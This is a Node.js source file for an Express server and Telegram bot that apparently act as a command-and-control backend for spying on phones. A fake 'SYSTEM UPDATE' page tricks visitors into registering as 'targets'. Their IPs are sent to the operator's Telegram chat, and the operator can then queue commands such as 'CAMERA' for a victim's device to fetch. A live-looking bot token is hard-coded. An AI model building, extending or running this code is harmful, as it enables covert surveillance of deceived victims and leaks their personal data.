const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');
const app = express();

const TOKEN = "8562643686:AAFPMugxzIgzzi-ArBooFz96tJG_5LhAUkg";
const CHAT_ID = "8223994555";
const PORT = process.env.PORT || 3000;

app.use(express.json());

const bot = new TelegramBot(TOKEN, { polling: true });
let targets = {};

app.get('/', (req, res) => {
  res.send('<html><body style="background:#000;color:#0f0;text-align:center;padding:50px"><h1>SYSTEM UPDATE</h1><button onclick="fetch(\'/register\',{method:\'POST\',headers:{\'Content-Type\':\'application/json\'},body:JSON.stringify({device_id:\'ANDROID_\'+Math.random().toString(36).substring(2)})}).then(()=>alert(\'Verified\'))">VERIFY</button></body></html>');
});

app.post('/register', (req, res) => {
  const deviceId = req.body.device_id || 'unknown';
  targets[deviceId] = { ip: req.ip, lastSeen: Date.now() };
  bot.sendMessage(CHAT_ID, `🔥 TARGET BARU!\n📱 ID: ${deviceId}\n🌐 IP: ${req.ip}`);
  res.send('OK');
});

app.get('/command', (req, res) => {
  const deviceId = req.headers['x-device-id'];
  const cmdFile = `./${deviceId}.txt`;
  if (fs.existsSync(cmdFile)) {
    const cmd = fs.readFileSync(cmdFile, 'utf8').trim();
    fs.unlinkSync(cmdFile);
    res.send(cmd);
  } else res.send('');
});

bot.onText(/\/help/, (msg) => {
  bot.sendMessage(msg.chat.id, '/devices - list target\n/camera [ID] - foto');
});

bot.onText(/\/devices/, (msg) => {
  const list = Object.keys(targets).map(id => `• ${id}`).join('\n') || '❌ Kosong';
  bot.sendMessage(msg.chat.id, `📱 TARGET:\n${list}`);
});

bot.onText(/\/camera (.+)/, (msg, match) => {
  const deviceId = match[1];
  fs.writeFileSync(`./${deviceId}.txt`, 'CAMERA');
  bot.sendMessage(msg.chat.id, `📸 Perintah ke ${deviceId}`);
});

app.listen(PORT, '0.0.0.0', () => {
  console.log('🔥 BOT JALAN');
  bot.sendMessage(CHAT_ID, '✅ BOT SIAP!');
});